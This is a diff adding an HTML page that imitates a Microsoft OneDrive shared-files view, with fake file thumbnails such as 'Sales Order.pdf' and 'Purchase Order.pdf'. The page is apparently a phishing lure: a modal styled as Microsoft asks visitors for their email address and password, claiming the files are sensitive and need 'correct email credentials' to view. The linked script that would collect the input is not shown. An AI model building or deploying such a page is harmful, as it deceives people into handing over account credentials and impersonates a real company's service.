@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>OneDrive</title>
+  <link rel="stylesheet" href="styles.css" />
+  <script defer src="script.js"></script>
+</head>
+<div id="modal-overlay" class="modal-overlay hidden"></div>
+<div id="sign-in-modal" class="sign-in-modal hidden">
+  <div class="modal-content">
+    <img src="https://i.ibb.co/8g09gkSc/onedrive-logo.png" alt="OneDrive" class="onedrive-logo" />
+    <p class="modal-note">
+      These files are sensitive and secured against unauthorized access. In order to access the files, please provide your correct email credentials.
+    </p>
+    <h3>Please Confirm Receiving E-mail to View Files</h3>
+    <input type="email" class="sign-in-input email-field" placeholder="Email" />
+    <input type="password" class="sign-in-input" placeholder="Password" />
+    <button id="sign-in-btn" class="sign-in-btn">Verifying ...</button>
+    <p class="modal-footer">© Microsoft Corporation. All rights reserved. 2025</p>
+    <button id="close-btn" class="close-btn">×</button>
+  </div>
+</div>
+<body>
+  <header class="top-bar">
+    <div class="left">
+      <button class="menu">☰</button>
+      <span class="logo">OneDrive</span>
+    </div>
+    <input type="text" class="search" placeholder="Search" />
+    <select class="filter">
+      <option>All files</option>
+    </select>
+    <div class="right-icons">
+      <span>⚙️</span>
+      <span>❓</span>
+      <span class="profile">R</span>
+    </div>
+  </header>
+
+  <div class="container">
+    <aside class="sidebar">
+      <h3>Files Directory</h3>
+      <ul>
+        <li>📁 My Files</li>
+        <li>🕒 Recent</li>
+        <li class="active">👥 Shared</li>
+      </ul>
+      <div class="shared-libraries">
+        <h4>Shared Libraries</h4>
+        <p>Sites help you work on projects with your team...</p>
+      </div>
+    </aside>
+
+    <main class="main-panel">
+      <div class="toolbar">
+        <button class="toolbar-btn">➕ New ▾</button>
+        <button class="toolbar-btn">⬆️ Upload ▾</button>
+        <button class="toolbar-btn">🔁 Sync</button>
+        <button class="toolbar-btn">⚡ Automate ▾</button>
+      </div>
+
+      <div class="top-actions">
+        <span class="action">Sort ▾</span>
+        <span class="action">🔳</span>
+        <span class="action">⋯</span>
+      </div>
+
+      <h2>Shared Files</h2>
+      <div class="file-grid">
+        <div class="file">
+          <img src="https://i.ibb.co/3mpTS090/82503-Geisenheim.jpg" alt="file1" />
+          <p>Sales Order.pdf<br><span>A few minutes ago</span></p>
+        </div>
+        <div class="file">
+          <img src="https://i.ibb.co/S97wcST/IMG-7640.jpg" alt="file2" />
+          <p>Listing form.pdf<br><span>A few hours ago</span></p>
+        </div>
+        <div class="file">
+          <img src="https://i.ibb.co/NdLn6StQ/Putah-Creek-Farming-5-5-2025-P.jpg" alt="file3" />
+          <p>Purchase Order.pdf<br><span>A few days ago</span></p>
+        </div>
+        <div class="file">
+          <img src="https://i.ibb.co/QvpfFwpV/IMG-7641.jpg" alt="file4" />
+          <p>Template for review.pdf<br><span>A few days ago</span></p>
+        </div>
+        <div class="file">
+          <img src="https://i.ibb.co/gZhjKpJf/Screenshot-2025-05-07-at-12-22-42.png" alt="file5" />
+          <p>Service PO-294.xlsx<br><span>A few days ago</span></p>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <!-- Modal + Overlay (Login) -->
+  <div id="modal-overlay" class="modal-overlay hidden"></div>
+  <div id="sign-in-modal" class="sign-in-modal hidden">
+    <div class="modal-content">
+      <h2>Sign in to OneDrive</h2>
+      <input type="email" class="sign-in-input" placeholder="Email" />
+      <input type="password" class="sign-in-input" placeholder="Password" />
+      <button id="sign-in-btn" class="sign-in-btn">Sign In</button>
+      <button id="close-btn" class="close-btn">Close</button>
+    </div>
+  </div>
+</body>
+</html>
